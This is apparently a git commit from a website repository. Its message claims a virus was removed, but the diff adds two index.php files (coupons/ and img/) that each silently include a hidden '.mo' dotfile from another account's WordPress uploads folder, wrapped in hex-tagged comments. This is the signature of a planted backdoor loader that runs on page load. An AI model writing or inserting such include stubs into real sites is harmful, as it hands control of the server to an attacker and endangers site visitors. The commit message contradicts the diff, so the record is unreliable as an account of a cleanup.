6bf3598716348d82e8850c4ec39b94cc2bf9085e
vidhungit <vidhun.rndsllc@gmail.com>
2024-01-23 12:56:56 +0530

    full virus removed and loaded in local server
    full virus removed and loaded in local server

---
+++ rooterrangerphoenix.com/coupons/index.php
@@ -0,0 +1,7 @@
+<?php
+/*19315*/
+
+@include ("/home/backintheblack/public_html/wp-content/uploads/2018/.617bb266.mo");
+
+/*19315*/
+
---
+++ rooterrangerphoenix.com/img/index.php
@@ -0,0 +1,7 @@
+<?php
+/*70fdb*/
+
+@include ("/home/backintheblack/public_html/wp-content/uploads/2018/.617bb266.mo");
+
+/*70fdb*/
+
